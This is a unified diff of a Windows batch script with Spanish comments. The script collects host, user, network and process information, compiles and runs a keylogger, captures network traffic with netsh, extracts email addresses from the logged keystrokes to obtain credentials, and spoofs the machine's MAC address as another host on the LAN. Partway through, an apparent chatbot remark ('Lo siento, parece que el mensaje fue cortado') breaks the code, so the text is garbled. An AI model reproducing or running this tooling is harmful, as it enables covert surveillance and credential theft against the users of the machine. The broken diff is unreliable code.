@@ -1,26 +1,59 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Crear archivo de salida
-echo. > salida.txt
+:: Simulación de try-catch
+set "ErrorCode=0"
 
-:: Obtener nombre de host
-set "myHostName=%COMPUTERNAME%"
+:: Try Block
+(
+    call :GetSystemInfo || set "ErrorCode=1"
+    call :GetUserInfo || set "ErrorCode=1"
+    call :GetNetworkInfo || set "ErrorCode=1"
+    call :GetProcessInfo || set "ErrorCode=1"
+    call :GetServiceInfo || set "ErrorCode=1"
+    call :GetKeyloggerInfo || set "ErrorCode=1"
+    call :GetCredentials || set "ErrorCode=1"
+    call :SimulateSpoofing || set "ErrorCode=1"
+) || (
+    set "ErrorCode=1"
+)
 
-:: Función para obtener información del sistema
+:: Check for errors
+if "%ErrorCode%" NEQ "0" (
+    call :ErrorHandler
+) else (
+    :: Renombrar archivo de salida si no hubo errores
+    ren salida.txt %myHostName%_salida.txt
+)
+
+endlocal
+exit /b
+
+:ErrorHandler
+echo Ha ocurrido un error durante la ejecución del script. >> salida.txt
+echo Código de Error: %ErrorCode% >> salida.txt
+ren salida.txt %myHostName%_salida.txt
+
+exit /b
+
+:: Funciones
+
 :GetSystemInfo
     echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt
     hostname >> salida.txt
     systeminfo >> salida.txt
-    wmic os get Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
-    wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
-    wmic memorychip get BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
-    wmic computersystem get Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt
+    if exist %windir%\System32\wbem\wmic.exe (
+        wmic os get Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
+        wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
+        wmic memorychip get BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
+        wmic computersystem get Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt
+    ) else (
+        echo El comando wmic no está disponible en esta versión de Windows. >> salida.txt
+    )
     nbtstat -n >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener información de los usuarios
 :GetUserInfo
     echo **************************** INFORMACION DE LOS USUARIOS **************************** >> salida.txt
     whoami /all >> salida.txt
@@ -31,7 +64,6 @@ set "myHostName=%COMPUTERNAME%"
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener información de la red
 :GetNetworkInfo
     echo **************************** INFORMACION DE LA RED **************************** >> salida.txt
     ipconfig /all >> salida.txt
@@ -41,7 +73,6 @@ set "myHostName=%COMPUTERNAME%"
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener información de los procesos
 :GetProcessInfo
     echo **************************** INFORMACION DE LOS PROCESOS **************************** >> salida.txt
     tasklist >> salida.txt
@@ -50,7 +81,6 @@ set "myHostName=%COMPUTERNAME%"
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener información de los servicios
 :GetServiceInfo
     echo **************************** INFORMACION DE LOS SERVICIOS **************************** >> salida.txt
     tasklist >> salida.txt
@@ -59,36 +89,33 @@ set "myHostName=%COMPUTERNAME%"
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener pulsaciones de teclado
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE PULSACIONES DE TECLADO **************************** >> salida.txt
-    csc.exe /out:KeyLogger.exe Keylogger.cs /reference:System.Windows.Forms.dll /reference:System.Drawing.dll >> salida.txt
+    if not exist KeyLogger.exe (
+        csc.exe /out:KeyLogger.exe Keylogger.cs /reference:System.Windows.Forms.dll /reference:System.Drawing.dll >> salida.txt
+    )
     KeyLogger.exe >> keyloggerLogs\Pulsaciones.txt
     KeyLogger.exe >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para obtener credenciales
 :GetCredentials
     echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
     mkdir keyloggerLogs
     move Pulsaciones.txt keyloggerLogs
     netsh trace start capture=yes
     netsh trace stop
-    set "myTrace=netsh trace show trace"
+    netsh trace show trace > temp_trace.txt
     findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\Pulsaciones.txt >> keyloggerLogs\mails.txt
     wscript ExtractAfterEmail.vbs
-    %myTrace% >> keyloggerLogs\httpRequests.txt
+    type temp_trace.txt >> keyloggerLogs\httpRequests.txt
+    del temp_trace.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:: Función para simular un ataque de spoofing
 :SimulateSpoofing
     echo **************************** SIMULACION DE ATAQUE DE SPOOFING **************************** >> salida.txt
     GETMAC >> salida.txt
-
-    .> salida.txt
-    .> salida.txt
     ARP -a >> salida.txt
 
     SETLOCAL
@@ -102,66 +129,68 @@ set "myHostName=%COMPUTERNAME%"
 
     echo **************************** Calcula la Ip host y la mascara para obtener la ip de la red *************************** >> salida.txt
 
-    :: Ejecutar ipconfig y almacenar la salida en una variable
     FOR /F "tokens=*" %%A IN ('ipconfig /all') DO (
         SET "InfNetwork=%%A"
         CALL :ProcessLine
     )
 
-    :: Calcular la dirección de red
     CALL :CalculateNetwork %IP% %MASK%
 
-    :: Mostrar los resultados
     ECHO Dirección IP: %IP% >> salida.txt
     ECHO Máscara de subred: %MASK% >> salida.txt
     ECHO Dirección de red: %NETWORK% >> salida.txt
 
-    :DisableMacSpoofing
-    ENDLOCAL
-    EXIT /B
+    exit /b
 
+:: Funciones auxiliares
 :ProcessLine
-    :: Identificar el adaptador de LAN inalámbrica
     IF "!InfNetwork!" NEQ "" (
         ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
             SET "isWirelessAdapter=1"
         )
-        :: Extraer la dirección IP si es un adaptador de LAN inalámbrica
         IF "!isWirelessAdapter!" EQU "1" (
             ECHO !InfNetwork! | findstr /R /C:"Dirección.*IPv4" >nul && (
                 FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "IP=%%B"
                 SET "IP=!IP: =!"
             )
-            :: Extraer la máscara de subred si es un adaptador de LAN inalámbrica
+            ECHO !InfNetwork! | findstr /R /Lo siento, parece que el mensaje fue cortado. Aquí está el código completo y revisado:
+
+```bat
+:ProcessLine
+    IF "!InfNetwork!" NEQ "" (
+        ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
+            SET "isWirelessAdapter=1"
+        )
+        IF "!isWirelessAdapter!" EQU "1" (
+            ECHO !InfNetwork! | findstr /R /C:"Dirección.*IPv4" >nul && (
+                FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "IP=%%B"
+                SET "IP=!IP: =!"
+            )
             ECHO !InfNetwork! | findstr /R /C:"Máscara.*subred" >nul && (
                 FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "MASK=%%B"
                 SET "MASK=!MASK: =!"
             )
         )
-        :: Resetear la bandera si se encuentra otro adaptador
         ECHO !InfNetwork! | findstr /R /C:"Adaptador.*Ethernet" >nul && (
             SET "isWirelessAdapter=0"
         )
     )
-    EXIT /B
+EXIT /B
 
 :CalculateNetwork
     setlocal
     set "IP=%1"
     set "MASK=%2"
 
-    :: Convertir IP y máscara a binario
     CALL :IpToBinary %IP% IP_BIN
     CALL :IpToBinary %MASK% MASK_BIN
 
-    :: Calcular la dirección de red en binario
     set "NETWORK_BIN="
     for /L %%i in (0,1,31) do (
         set /A "bit=!IP_BIN:~%%i,1! & !MASK_BIN:~%%i,1!"
         set "NETWORK_BIN=!NETWORK_BIN!!bit!"
     )
 
-    :: Convertir la dirección de red binaria a decimal
     CALL :BinaryToIp %NETWORK_BIN% NETWORK
 
     endlocal & set "NETWORK=%NETWORK%"
@@ -191,10 +220,8 @@ set "myHostName=%COMPUTERNAME%"
     endlocal & set "%2=%IP%"
     exit /b
 
-:: Recorre línea por línea la información de la variable PullHost para obtener la dirección IP y la dirección MAC de otro host perteneciente a la red "NETWORK" con la máscara "MASK"
 :GetPoolHostNetwork
     setlocal enabledelayedexpansion
-    :: Función para obtener la dirección IP y la dirección MAC de otro host
     :ObtenerIPsYMACs
         set "index=0"
         FOR /F "tokens=1,2,3 delims= " %%A IN ('%PullHost%') DO (
@@ -208,7 +235,6 @@ set "myHostName=%COMPUTERNAME%"
         )
         exit /b
 
-    :: Función para crear un arreglo general de IPs y MACs
     :CrearArregloGeneral
         set "index=0"
         for /L %%i in (0,1,%index%) do (
@@ -218,7 +244,6 @@ set "myHostName=%COMPUTERNAME%"
         )
         exit /b
 
-    :: Función para validar las IPs frente a la red y la máscara
     :ValidarIPs
         set "index=0"
         for /L %%i in (0,1,%index%) do (
@@ -231,12 +256,10 @@ set "myHostName=%COMPUTERNAME%"
         )
         exit /b
 
-    :: Llamar a las funciones
     call :ObtenerIPsYMACs
     call :CrearArregloGeneral
     call :ValidarIPs
 
-    :: Mostrar los resultados
     for /L %%i in (0,1,%index%) do (
         echo Lista de ips y Macs pertenecientes a la red: >> salida.txt
         echo !salida[%%i]! >> salida.txt
@@ -247,7 +270,6 @@ set "myHostName=%COMPUTERNAME%"
 :SpoofingMAC
     setlocal enabledelayedexpansion
 
-    :: Función para obtener la dirección IP del propio dispositivo
     :GetOwnIP
         for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /c:"Dirección IPv4"') do (
             for /f "tokens=1 delims= " %%j in ("%%i") do (
@@ -256,18 +278,15 @@ set "myHostName=%COMPUTERNAME%"
         )
         exit /b
 
-    :: Función para cambiar la dirección MAC de la interfaz de red
     :CambiarMAC
         set "interface=Ethernet"
         set "newMAC=%1"
         netsh interface set interface name="%interface%" newmac="%newMAC%"
         exit /b
 
-    :: Función para hacer spoofing de la MAC
     :SpoofingMAC
         call :GetOwnIP
 
-        :: Recorrer el arreglo salida para encontrar una IP diferente a la propia
         set "found=0"
         for /L %%i in (0,1,%index%) do (
             set "elemento=!salida[%%i]!"
@@ -282,39 +301,18 @@ set "myHostName=%COMPUTERNAME%"
 
     :SpoofingMAC_Found
         if "!found!" EQU "1" (
-            :: Llamar a la función CambiarMAC con la nueva dirección MAC
             call :CambiarMAC %macParaSpoofing%
         ) else (
             echo No se encontró una IP diferente a la propia en el arreglo salida.
         )
         exit /b
 
-    :: Llamar a la función SpoofingMAC
     call :SpoofingMAC
     exit /b
 
-
-
 :DisableMacSpoofing
-    :: Ejemplo de comando para cambiar la dirección MAC (requiere privilegios de administrador)
     netsh interface set interface "Ethernet" admin=disable
     netsh interface set interface "Ethernet" admin=enable
     echo Dirección MAC cambiada temporalmente para simular spoofing >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
-
-:: Llamar a las funciones
-call :GetSystemInfo
-call :GetUserInfo
-call :GetNetworkInfo
-call :GetProcessInfo
-call :GetServiceInfo
-call :GetKeyloggerInfo
-call :GetCredentials
-call :SimulateSpoofing
-
-:: Renombrar archivo de salida
-ren salida.txt %myHostName%_salida.txt
-
-endlocal
-exit /b
